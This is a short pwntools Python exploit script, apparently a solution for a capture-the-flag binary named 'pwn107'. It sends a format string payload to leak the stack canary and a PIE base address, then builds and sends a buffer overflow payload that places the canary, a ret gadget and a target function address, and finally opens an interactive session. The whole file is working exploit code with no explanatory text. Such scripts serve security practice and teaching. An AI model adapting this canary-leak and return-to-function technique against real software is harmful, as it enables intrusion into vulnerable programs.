from pwn import *

#Format string exploit
# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './pwn107.pwn107'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

first_offset = b"A"*24 
second_offset = b"A"*8

#find the dynamic canary
p = start()
pay = b'%9$lx-%13$lx'

p.sendlineafter(b'? ',pay)
p.recvline()


string_value = p.recvline().strip().split(b' ')[3]


canary_addr = int(string_value.split(b'-')[1],16) #13,21,26,27#

log.info("Canary address: %s" % hex(canary_addr))

#find the base adddress
leak = int(string_value.split(b'-')[0],16) # 7,9,11,18,20,22,37
base_addr = leak - 0xa90

log.info("PIE LEAK: %s" % hex(base_addr))

align = base_addr + 0x06fe #ret gadget
func_address = base_addr + 0x94c

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# How many bytes to the instruction pointer (EIP)?##
#extracting the address provided##
payload = flat(
    first_offset + p64(canary_addr) + second_offset + p64(align) + p64(func_address)
)#

print(payload)#

# Save the payload to file
write('payload1', payload)##

# Send the payload
p.sendline(payload)##

# Receive the flag
p.interactive()
